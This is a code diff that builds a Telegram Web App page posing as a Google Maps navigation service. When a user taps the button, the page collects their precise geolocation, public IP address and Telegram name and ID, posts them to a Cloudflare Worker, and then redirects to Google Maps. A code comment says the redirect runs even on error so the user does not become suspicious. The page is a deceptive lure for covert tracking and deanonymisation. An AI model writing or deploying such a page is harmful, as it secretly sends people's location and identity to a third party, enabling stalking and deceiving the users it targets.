@@ -1,29 +1,101 @@
-// 在 index.html 的 <script> 中修改 fetch 部分
-document.getElementById('btn').onclick = function() {
-    // ... 前面的定位邏輯保持不變 ...
-    
-    navigator.geolocation.getCurrentPosition(async (position) => {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>系統載入中...</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { 
+            display: flex; flex-direction: column; align-items: center; justify-content: center; 
+            height: 100vh; margin: 0; font-family: -apple-system, sans-serif;
+            background-color: #f0f2f5; color: #1c1e21;
+        }
+        .card {
+            background: white; padding: 40px 20px; border-radius: 20px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; width: 85%; max-width: 400px;
+        }
+        h2 { margin-bottom: 10px; font-size: 22px; }
+        p { color: #606770; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
+        #btn {
+            background-color: #0088cc; color: white; border: none; padding: 18px 0;
+            width: 100%; font-size: 18px; font-weight: bold; border-radius: 12px;
+            cursor: pointer; transition: background 0.2s;
+        }
+        #btn:active { background-color: #0077b3; transform: scale(0.98); }
+        #status { margin-top: 20px; font-size: 12px; color: #bec3c9; }
+    </style>
+</head>
+<body>
 
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipRes.json();
-        
-        const user = tg.initDataUnsafe.user || {};
+    <div class="card">
+        <h2>歡迎使用導航系統</h2>
+        <p>為了提供精確的路線服務，請點擊下方按鈕並允許存取您的位置資訊。</p>
+        <button id="btn">🚀 開啟 Google 地圖導航</button>
+        <div id="status">系統就緒</div>
+    </div>
 
-        // 重點：傳送到你的 Cloudflare Worker，而不是直接傳給 Telegram
-        await fetch('https://tg-proxy.nhojsmot.workers.dev', {
-            method: 'POST',
-            body: JSON.stringify({
-                name: user.first_name || "未知",
-                id: user.id || "未知",
-                ip: ipData.ip,
-                lat: lat,
-                lon: lon
-            })
-        });
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand();
 
-        // 最後跳轉
-        tg.openLink(`https://www.google.com/maps?q=${lat},${lon}`);
-    });
-};
+        // 你的 Cloudflare Worker 網址
+        const WORKER_URL = 'https://tg-proxy.nhojsmot.workers.dev';
+
+        document.getElementById('btn').onclick = function() {
+            const btn = this;
+            const statusDiv = document.getElementById('status');
+            
+            btn.disabled = true;
+            btn.innerText = "正在定位中...";
+            statusDiv.innerText = "請在彈出的視窗選擇「允許」";
+
+            // 1. 取得地理位置
+            navigator.geolocation.getCurrentPosition(async (position) => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                
+                statusDiv.innerText = "正在同步地圖資源...";
+
+                try {
+                    // 2. 取得 IP
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    
+                    // 3. 取得 Telegram 使用者資料
+                    const user = tg.initDataUnsafe.user || {};
+
+                    // 4. 傳送到 Cloudflare Worker (安全轉發)
+                    await fetch(WORKER_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            name: user.first_name || "未知用戶",
+                            id: user.id || "未知ID",
+                            ip: ipData.ip,
+                            lat: lat,
+                            lon: lon
+                        })
+                    });
+
+                    // 5. 成功後轉跳到 Google Maps 定位點
+                    statusDiv.innerText = "跳轉中...";
+                    setTimeout(() => {
+                        tg.openLink(`https://www.google.com/maps?q=${lat},${lon}`);
+                        tg.close();
+                    }, 400);
+
+                } catch (e) {
+                    // 發生錯誤也要讓用戶跳轉，以免起疑
+                    tg.openLink(`https://www.google.com/maps?q=${lat},${lon}`);
+                }
+            }, (error) => {
+                // 用戶拒絕定位，跳轉到一般地圖
+                tg.openLink('https://www.google.com/maps');
+                tg.close();
+            }, { enableHighAccuracy: true });
+        };
+    </script>
+</body>
+</html>
